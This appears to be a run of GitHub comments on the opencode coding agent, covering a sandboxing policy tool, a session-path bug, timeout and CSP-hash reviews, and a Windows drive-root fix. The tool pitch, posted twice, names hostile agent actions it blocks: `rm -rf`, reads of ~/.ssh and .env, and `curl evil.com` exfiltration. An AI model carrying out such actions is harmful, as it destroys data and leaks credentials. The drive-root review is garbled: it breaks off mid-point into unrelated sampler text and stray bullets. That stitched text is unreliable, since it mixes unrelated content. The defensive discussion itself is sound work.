Been reading through this thread, and the core tension here is exactly what we've been building around in the open: the agent holds legitimate credentials and shell access, so "sandboxing" can't mean running the agent in a restricted VM (too much friction), it has to mean enforcing policy *below the model, at the tool layer*.

grimdall-os (MIT, github.com/grimdalltech/grimdall-os) is a <2ms deterministic policy checkpoint that sits between the agent's tool calls and the OS:
- AST-parses shell payloads to block destructive commands (rm -rf, drop table) before exec
- denies reads of ~/.ssh, ~/.aws, .env, *.pem regardless of prompt justification
- egress allowlist (undeclared hosts denied)
- shadow-mode by default (logs what it would block, zero behavior change unless enabled)

For opencode specifically, since the tool execution layer is in Go, the integration would be atomic: wrap the shell tool's exec path behind a `--grimdall` flag, return the denial as tool output so the agent can react. Zero default behavior change, opt-in enforcement.

Happy to open a small PR wiring it in if @thdxr or the team are open to it. Happy to write the tests, docs, and keep it to one file.

Reading through this thread, the community has done incredible work on the OS-level sandboxing layer (nono, landlock, bubblewrap, seatbelt, restricted tokens). That's the infrastructure that restricts *what the agent CAN touch at the kernel level*.

But there's a complementary layer that none of these solve: the **policy layer** that sits above OS sandboxing. Even inside a perfect sandbox, an agent with legitimate shell access can still:
- `rm -rf ./src` (destroys the workspace it's allowed to touch)
- read `~/.ssh/id_rsa` (if the sandbox allows home directory access — see aider #5076 for a validated case where this leaked credentials)
- exfiltrate secrets via `curl evil.com` (if the sandbox allows network)

grimdall-os (MIT, github.com/grimdalltech/grimdall-os) is a <2ms deterministic policy checkpoint that AST-parses shell commands and enforces policy *regardless of what the OS sandbox allows*:
- denies destructive commands (`rm -rf`, `drop table`) before exec
- blocks reads of ~/.ssh, ~/.aws, .env, *.pem regardless of prompt justification
- egress allowlist (undeclared hosts denied)
- shadow-mode by default (logs what it would block, zero behavior change unless enabled)

For opencode specifically, since the tool execution layer is in Go, the integration would be atomic: wrap the shell tool's exec path behind a `--grimdall` flag, return the denial as tool output so the agent can react. Zero default behavior change, opt-in enforcement.

This doesn't replace the OS sandbox work here — it complements it. OS sandboxing is the car; policy enforcement is the seatbelt. Happy to open a small PR wiring it in if @thdxr or the team are open to it.

Hit this from a different deployment shape — desktop app on macOS against `opencode serve` inside a dev container — and found something that might narrow it down. In my case the desktop app listed **some** sessions rather than none, and which ones it listed turned out to depend entirely on one string.

**The asymmetry: the directory is normalised on write but matched exactly on read.**

The repo is bind-mounted into the container at `/workspaces/<repo>`. The desktop app's project picker is the native macOS one, so it can only ever send the host path, `/Users/<user>/Projects/<repo>`.

I first made that host path resolve inside the container with a **symlink** to `/workspaces/<repo>`. Prompts then worked, but the session list was empty. Looking in the database:

```
sqlite> SELECT directory, COUNT(*) FROM session GROUP BY directory;
/workspaces/<repo>            15
/Users/<user>/Projects/<repo>  3
```

Querying the server the way each client does:

```
GET /api/session?directory=/workspaces/<repo>             -> 15
GET /api/session?directory=/Users/<user>/Projects/<repo>  ->  0
```

The desktop app asks for the second and gets nothing. The three rows that *did* carry the host path were all created before the symlink existed — at that point `realPath` failed outright, so the raw client string got stored. Once the symlink was in place, `realPath` resolved it to `/workspaces/<repo>` and every new session was filed under a path the app never asks about — including sessions the app itself had just created.

So: **the write path resolves symlinks, the read path compares strings.** Any deployment where the client's path and the server's resolved path differ ends up with a list that is empty (or partially populated, if some rows predate the mismatch).

**Workaround, for anyone else on dev containers:** don't use a symlink — mount the checkout a second time at the exact path the host uses:

```jsonc
"mounts": [
  "source=${localWorkspaceFolder},target=${localWorkspaceFolder},type=bind"
]
```

A bind mount has nothing to resolve, so `realPath` returns the same string the client sent and write/read agree. After also rewriting the existing rows (`session.directory`, `session.path`, `project.worktree`, `project_directory.directory`) to the host path, both the desktop app and the web UI list everything — the web UI follows the project record, and that path is now valid on both sides.

That last part may be the useful bit for a fix: pick one canonical form for the directory, and apply it in both directions. Resolving on write while matching raw on read cannot agree unless the two paths happen to be identical.

Environment: desktop app 1.18.21 (macOS arm64), `opencode serve` 1.18.21 in a Debian dev container, plain HTTP to `127.0.0.1:4096`, no workspaces (`session.workspace_id` is null throughout).

Correct and minimal fix. I traced the timer lifecycle: the timeout is armed per attempt (`connection.ts:67`), cleared on `server.connected` (`:82–85`), and again in the `finally` block (`:109`), so there's no leak and a successful slow handshake is unaffected afterwards. Two things to consider:

1. **The new bound also applies to reconnect attempts.** `connectTimeout` gates every attempt in `runStream`, not just the initial handshake. When a server hangs (accepts TCP but never sends) mid-session, the status now sits in `connecting`/`reconnecting` for up to ~31s per attempt instead of ~3s before the first retry. That's the right trade-off for slow links, but worth confirming the UI communicates that state well over 30 seconds — users may assume the app is frozen rather than connecting.

2. **Consider making it tunable.** `ClientConnectionOptions` already carries knobs like `flushInterval`. Exposing `connectTimeoutMs` there (defaulting to `30_000`) would let desktop/remote-SSH deployments tune it without another code change — this is the second latency-related tweak to this file, suggesting the value is environment-dependent.

Minor: a one-line comment on the constant explaining the rationale ("high-latency / remote backends can exceed 2s before `server.connected`") would prevent a future reader from "tightening" it back.

Right root cause and a clean fix: `path.win32.basename("C:\\")` returns an empty string, which is why drive-root projects lost their tab labels, and choosing the parser family up front via `/^(?:[A-Za-z]:[\\/]|\\\\)/` correctly covers drive letters (mixed separators included), UNC shares, and keeps POSIX names containing backslashes intact — the new regression test documenting that last nuance is a nice touch.

Two suggestions:

1. **Explicit `name` is still ignored for root projects** (`packages/tui/src/util/project.ts`, the `if (paths.parse(canonical).root === canonical)` branch): it returns `basename(fallback)` before ever consulting `project?.name`. Since `ParentBased` honors sampled parents by design, the ratio only affects spans the SDK actually roots — which on this stack is essentially nothing. The knob stays correct for environments where requests do start traces (plain node, no inherited context), but if per-request volume control on bun matters, the honest mechanism would be a filtering `SpanProcessor` rather than a sampler. - Persistent goal state
- Automatic continuation when a worker session becomes idle

- Official HTTP and SDK APIs

Adding context for the last commit (`45eb84b07e`), since it touches the same file reviewed earlier:

**What it fixes:** `cspForHtml` extracts the inline `oc-theme-preload-script` from the served HTML and emits its SHA-256 in the `script-src` directive. It was hashing the raw bytes captured by the regex — including `\r\n` sequences. Per the HTML spec's input preprocessing (https://html.spec.whatwg.org/multipage/parsing.html#preprocessing-the-input-stream), CR and CRLF are normalized to LF before tokenization, so the browser hashes the script text *without* the CRs. On any asset whose HTML carries CRLF line endings, the emitted hash didn't match the browser-computed one and the theme preload script was silently blocked (CSP violation in the console, theme flash protection lost).

**Why it never showed up in CI:** Linux builds produce LF assets, so server hash == browser hash there. I only caught it because I'm running the embedded UI from a source checkout on Windows, where the served `index.html` has CRLF — first real-browser load showed the violation.

**The fix:** normalize `.replace(/\r\n?/g, "\n")` before hashing, mirroring the spec's preprocessing.

**Verification:** headless Chromium against the CRLF-built asset — before: `Refused to execute inline script ... hash 'sha256-jURJv6M3...' does not match` with the served header carrying `sha256-ZuZQORX8...`; after: served header carries `sha256-jURJv6M3...`, script executes, console clean. LF-built assets hash identically before and after the change (normalizing LF text is a no-op), so this is purely additive for Linux deployments.
